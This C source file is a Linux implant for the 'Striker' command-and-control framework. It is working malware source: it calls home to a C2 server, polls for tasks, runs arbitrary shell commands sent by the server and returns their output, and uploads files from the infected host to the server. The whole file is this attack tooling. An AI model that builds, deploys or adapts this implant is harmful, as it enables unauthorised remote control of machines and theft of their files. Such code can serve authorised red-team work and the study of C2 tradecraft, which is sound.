/**
 * Striker C2 implant for linux hosts.
 *         Author: Umar Abdul
 */

#include "striker.h"

buffer *create_buffer(size_t size){

  buffer *buff = malloc(sizeof(buffer));
  buff->size = size;
  buff->used = 0;
  buff->buffer = malloc(sizeof(char) * ((buff->size == 0) ? 1 : buff->size));
  if (!buff->buffer){
    if (STRIKER_DEBUG)
      fprintf(stderr, "[-] Unable to allocate memory. Exiting.\n");
    exit(EXIT_FAILURE);
  }
  memset(buff->buffer, 0, buff->size);
  return buff;
}

void resize_buffer(buffer *buff, size_t new_size){

  if (buff->size == new_size)
    return;
  buff->size = new_size;
  if (buff->used > new_size)
    buff->used = new_size;
  buff->buffer = realloc(buff->buffer, (buff->size == 0 ? 1 : buff->size));
  if (!buff->buffer){
    if (STRIKER_DEBUG)
      fprintf(stderr, "[-] Unable to allocate memory. Exiting.\n");
    exit(EXIT_FAILURE);
  }
}

size_t append_buffer(buffer *dest, const void *src, size_t len){

  size_t free_bytes = dest->size - dest->used;
  if (free_bytes < len) // Available space not enough, increase the buffer size.
    resize_buffer(dest, dest->size + (len - free_bytes));
  memcpy(dest->buffer + dest->used, src, len);
  dest->used += len;
  return len;
}

size_t buffer_strcpy(buffer *dest, const char *src){

  size_t len = strlen(src);
  resize_buffer(dest, 0);
  return append_buffer(dest, src, len);
}

char *buffer_to_string(buffer *buff){

  char *str = malloc(sizeof(char) * (buff->used + 1));
  if (buff->used == 0)
    return NULL;
  strncpy(str, buff->buffer, buff->used);
  str[buff->used] = '\0';
  return str;
}

void free_buffer(buffer *buff){
  
  buff->size = 0;
  buff->used = 0;
  free(buff->buffer);
  free(buff);
}

CURL *init_curl(const char *path, buffer *buff){
  
  CURL *curl = curl_easy_init();
  if (!curl){
    if (STRIKER_DEBUG)
      fprintf(stderr, "[-] Error initializing curl!\n");
    exit(EXIT_FAILURE);
  }
  char *url = malloc(URL_SIZE);
  snprintf(url, URL_SIZE, "%s%s", baseURL, path);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
  return curl;
}

size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

  size_t chunk_size = size * nmemb;
  append_buffer(buff, chunk, chunk_size);
  return chunk_size; // This tells curl that we received all bytes.
}

cJSON *sysinfo(){

  cJSON *info = cJSON_Parse("{\"user\":\"agent47\", \"host\":\"debian\", \"os\":\"linux\"}");
  return info;
}

task *parse_task(cJSON *json){

  task *t = malloc(sizeof(task));
  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, "uid"));
  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, "taskType"));
  t->data = cJSON_GetObjectItemCaseSensitive(json, "data");
  t->completed = 0;
  t->result = NULL;
  return t;
}

void execute_task(session *striker, task *tsk){

  if (STRIKER_DEBUG)
    printf("[*] Executing task: %s\n", tsk->uid);
  cJSON *data = tsk->data;
  cJSON *result = cJSON_CreateObject();
  buffer *result_buff = create_buffer(0);
  if (!strcmp(tsk->type, "system")){ // Run a shell command.
    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "cmd"));
    if (!cmd)
      goto complete;
    char *shell_cmd = malloc(sizeof(char) * 1024);
    snprintf(shell_cmd, sizeof(char) * 1024, "%s 2>&1", cmd);
    FILE *proc = popen(shell_cmd, "r");
    if (!proc){
      free(shell_cmd);
      goto complete;
    }
    const short chunk_size = 1024;
    char *tmp = malloc(sizeof(char) * chunk_size);
    while (result_buff->used < MAX_RES_SIZE){
      if (fgets(tmp, chunk_size, proc) == NULL)
        break;
      append_buffer(result_buff, tmp, strlen(tmp));
    }
    pclose(proc);
  }else if (!strcmp(tsk->type, "download")){
    char *url, *filename;
    buffer *body;
    FILE *rfo;
    CURL *curl;
    CURLcode res;
    curl_mime *form;
    curl_mimepart *field;
    curl = curl_easy_init();
    if (!curl)
      goto complete;
    url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s/%s", baseURL, striker->uid, tsk->uid) < 0)
      abort();
    filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
    if (!filename)
      goto complete;
    rfo = fopen(filename, "r");
    if (!rfo){
      buffer_strcpy(result_buff, "Unable to open file!");
      goto complete;
    }
    fclose(rfo);
    body = create_buffer(0);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    form = curl_mime_init(curl);
    field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, filename);
    field = curl_mime_addpart(form);
    curl_mime_name(field, "filename");
    curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
    res = curl_easy_perform(curl);
    free_buffer(body);
    curl_mime_free(form);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK)
      buffer_strcpy(result_buff, curl_easy_strerror(res));
  }else{
    buffer_strcpy(result_buff, "Not implemented!");
  }

  complete:
    if (STRIKER_DEBUG)
      printf("[+] Task completed: %s\n", tsk->uid);
    tsk->completed = 1;
    char *res = buffer_to_string(result_buff);
    cJSON_AddItemToObject(result, "uid", cJSON_CreateString(tsk->uid));
    cJSON_AddItemToObject(result, "result", cJSON_CreateString(res));
    tsk->result = result;
    free_buffer(result_buff);
}

void start_session(){  
  
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(sizeof(char) * 32);
  striker->delay = 5;

  CURL *curl;
  CURLcode res;
  // Build the common headers that will be used for GET and POST requests.
  struct curl_slist *get_headers = NULL, *post_headers = NULL;
  get_headers = curl_slist_append(get_headers, "Connection: close");
  post_headers = curl_slist_append(post_headers, "Connction: close");
  post_headers = curl_slist_append(post_headers, "Content-Type: application/json");
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
  
  while (1){ // Initiation loop.
    curl = init_curl("/agent/init", body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cJSON_PrintUnformatted(sysinfo()));
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
      sleep(striker->delay);
      continue;
    }
    break;
  }

  cJSON *config = cJSON_Parse(buffer_to_string(body));
  if (!config){
    if (STRIKER_DEBUG){
      const char *error = cJSON_GetErrorPtr();
      fprintf(stderr, "[-] Error parsing config: %s\n", error);
    }
    goto end;
  }
  striker->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, "uid"));
  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, "delay"));
  char *tasksURL = malloc(URL_SIZE);
  snprintf(tasksURL, URL_SIZE, "/agent/tasks/%s", striker->uid);
  printf("%s\n", cJSON_PrintUnformatted(config));
  while (1){
    resize_buffer(body, 0);
    sleep(striker->delay);
    // Fetch tasks.
    curl = init_curl(tasksURL, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
      continue;
    }
    // Parse and execute the tasks.
    cJSON *tasksJSON = cJSON_Parse(buffer_to_string(body));
    size_t tasksLen = cJSON_GetArraySize(tasksJSON);
    cJSON *results = cJSON_CreateArray();
    for (int i = 0; i < tasksLen; i++){
      task *tsk = parse_task(cJSON_GetArrayItem(tasksJSON, i));
      if (!tsk)
        continue;
      execute_task(striker, tsk);
      if (tsk->completed && tsk->result != NULL)
        cJSON_AddItemToArray(results, tsk->result);
    }
    // Send results.
    if (cJSON_GetArraySize(results) > 0){
      char *result = cJSON_PrintUnformatted(results);
      if (STRIKER_DEBUG)
        printf("[+] Task results: %s\n", result);
      while (1){
        resize_buffer(body, 0);
        curl = init_curl(tasksURL, body);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK){
          if (STRIKER_DEBUG)
            fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
          sleep(striker->delay);
          continue;
        }
        break;
      }
    }
    // Cleanup.
    cJSON_Delete(results);
    cJSON_Delete(tasksJSON);
  }

  free(tasksURL);

  end:
    curl_slist_free_all(get_headers);
    curl_slist_free_all(post_headers);
    free_buffer(body);
}

int main(int argc, char **argv){
  
  start_session();
  return 0;  
}
